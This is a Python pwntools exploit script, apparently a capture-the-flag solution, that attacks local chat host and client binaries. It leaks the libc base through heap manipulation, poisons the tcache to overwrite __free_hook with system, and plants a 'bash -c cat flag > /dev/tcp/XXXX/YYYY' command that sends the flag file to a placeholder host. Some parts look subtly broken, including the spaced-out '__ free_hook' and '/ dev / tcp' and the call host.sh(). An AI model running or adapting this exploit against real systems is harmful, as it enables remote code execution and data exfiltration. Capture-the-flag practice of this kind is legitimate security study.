from pwn import *
import os
import base64
import time
def set_name(sock, name):
    # log.info("set_name")
    sock.sendlineafter(b">", name)

def set_data(sock, type, data):
    # log.info("set_data")
    sock.sendlineafter(b"> ", b"1")
    print('Hello')
    sock.sendlineafter(b"> ", b"int" if type == b"int" else b"str")
    if isinstance(data, int):
        sock.sendlineafter(b"> ", str(data).encode())
    else:
        sock.sendlineafter(b"> ", data)

def send_data(sock):
    # log.info("send_data")
    sock.sendlineafter(b"> ", b"2")

def recv_data(sock):
    # log.info("recv_data")
    sock.sendlineafter(b"> ", b"3")
    return sock.recvlineafter(b":")

def bye(sock):
    # log.info("bye")
    sock.sendlineafter(b"> ", b"4")

def sync(s1):
    s1.recvuntil(b"opponent is")

def fake_data(data, close = True):
    client = setup(False)
    set_name(client, data)
    set_data(client, b"str" , b"Hello")
    set_data(client, b"int" , 1145141919810931893364364)
    send_data(client) # panic client
    time.sleep(1) #wait pythn
    if close:
        client.close()
    else:
        return client

def create(host, size, data):
    fake_data(b"2")
    fake_data(str(size).encode())
    fake_data(base64.b64encode(data).encode())
    recv_data(host)

def setup(is_host):
    # sock = Socket("35.221.113.221" , 30001)
    if is_host:
        sock = process('./chat/host')
    else:
        sock = process('./chat/client')
    context.clear(os='linux', arch='x86_64', log_level=logging.DEBUG)
    return sock

libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
try:
    host = setup(True)
    client = setup(False)
    set_name(host, b"tokyo")
    set_name(client, b"lio")
    set_data(host, b"int", 9)
    for i in range(8):
        send_data(host)
    set_data(client, b"str", b"Hello")
    set_data(client, b"int", 1145141919810931893364364)
    send_data(client) # panic client
    time.sleep(1) #wait pythn
    client.close()
    # leak libc base
    create(host, 0x20 , b"A" * 0x18)
    create(host, 0x1 , b"B")
    create(host, 0x30 , b"C")
    create(host, 0x20 , b"A" * 0x28 + p64(0x91))
    create(host, 0x1 , b"B")
    set_data(host, b"str", b'A ' * 0x60)
    set_data(host, b"str", b'\x00')
    client = setup(False)
    set_name(client, b"\x00")
    for i in range(20):
        send_data(host)
    libc_base = u64(recv_data(client)) - 0x2b73e0
    log.info("libc =" + hex(libc_base))
    libc.set_base(libc_base)
    set_data(client, b"str", b"Hello")
    set_data(client, b"int", 1145141919810931893364364)
    send_data(client) # panic client
    time.sleep(1) #wait pythn
    client.close()
    payload = b"D" * 0x28
    payload += p64(0x91)
    payload += p64(0)*3
    payload += p64(0x71)
    create(host, 0x20, payload)
    #tcache poisoning
    payload = b"F" * 0x58
    payload += p64(0x51)
    payload += p64(libc.symbol('__ free_hook'))
    create(host, 0x36, payload)
    create(host, 0x40, b'bash -c "cat flag *> / dev / tcp / XXXX / YYYY"')
    create(host, 0x40, p64(libc.symbol('system')))
    host.sh()
except Exception as e:
    print(e)
finally:
    try:
        os.unlink("env/connector/c2h")
    except:
        pass
    try:
        os.unlink("env/connector/h2c")
    except:
        pass
    try:
        os.unlink("env/connector/HOST")
    except:
        pass
    try:
        os.unlink("env/connector/CLIENT")
    except:
        pass